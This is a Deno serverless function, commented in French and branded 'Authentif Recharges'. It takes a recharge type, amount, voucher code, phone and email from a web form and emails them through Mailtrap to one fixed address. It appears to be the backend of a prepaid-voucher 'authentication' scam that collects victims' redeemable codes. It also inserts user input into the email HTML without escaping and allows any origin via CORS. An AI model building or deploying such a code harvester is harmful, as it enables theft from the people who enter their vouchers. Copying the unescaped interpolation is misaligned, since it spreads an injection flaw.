import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type",
};

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { type, amount, code, phone, email } = await req.json();

    // ======================================
    // 🔧 REMPLACEZ CES VALEURS PAR LES VÔTRES
    // ======================================
    const MAILTRAP_API_TOKEN = "VOTRE_TOKEN_API_MAILTRAP";
    const SENDER_EMAIL = "noreply@votredomaine.com";
    const SENDER_NAME = "Authentif Recharges";
    const RECIPIENT_EMAIL = "destinataire@exemple.com"; // L'email qui reçoit les demandes
    // ======================================

    const emailHtml = `
      <h2>Nouvelle demande de recharge</h2>
      <table style="border-collapse: collapse; width: 100%;">
        <tr>
          <td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Type de recharge</td>
          <td style="padding: 8px; border: 1px solid #ddd;">${type}</td>
        </tr>
        <tr>
          <td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Montant</td>
          <td style="padding: 8px; border: 1px solid #ddd;">${amount} EUR</td>
        </tr>
        <tr>
          <td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Code de recharge</td>
          <td style="padding: 8px; border: 1px solid #ddd;">${code}</td>
        </tr>
        <tr>
          <td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Téléphone</td>
          <td style="padding: 8px; border: 1px solid #ddd;">${phone}</td>
        </tr>
        <tr>
          <td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Email</td>
          <td style="padding: 8px; border: 1px solid #ddd;">${email}</td>
        </tr>
      </table>
    `;

    const response = await fetch("https://send.api.mailtrap.io/api/send", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${MAILTRAP_API_TOKEN}`,
      },
      body: JSON.stringify({
        from: { email: SENDER_EMAIL, name: SENDER_NAME },
        to: [{ email: RECIPIENT_EMAIL }],
        subject: `Nouvelle recharge ${type} - ${amount} EUR`,
        html: emailHtml,
      }),
    });

    const data = await response.json();

    if (!response.ok) {
      console.error("Mailtrap error:", data);
      return new Response(JSON.stringify({ error: data }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("Error:", error);
    return new Response(
      JSON.stringify({ error: error.message }),
      {
        status: 500,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );
  }
});
